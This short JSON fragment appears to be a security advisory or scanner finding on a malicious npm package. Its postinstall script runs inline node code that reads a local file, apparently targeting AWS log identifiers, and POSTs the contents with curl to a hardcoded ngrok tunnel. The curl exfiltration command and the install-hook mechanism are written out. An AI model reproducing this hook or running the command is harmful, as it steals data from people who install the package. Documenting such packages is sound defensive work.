  "summary": "postinstall exfiltrates local file contents to hardcoded ngrok tunnel",
  "details": "package.json declares a postinstall lifecycle script that runs an inline `node -e` payload reading a local file with fs.readFileSync and pipes the contents to `curl -X POST 'https://mourner-slot-explicit.ngrok-free.dev' --data-binary @-`. The script fires automatically on `npm install` and streams data from the installer's machine to a hardcoded anonymous ngrok tunnel controlled by the publisher. The inline payload includes parsing for AWS awslogs group/stream identifiers, consistent with targeting AWS/ECS environments.",
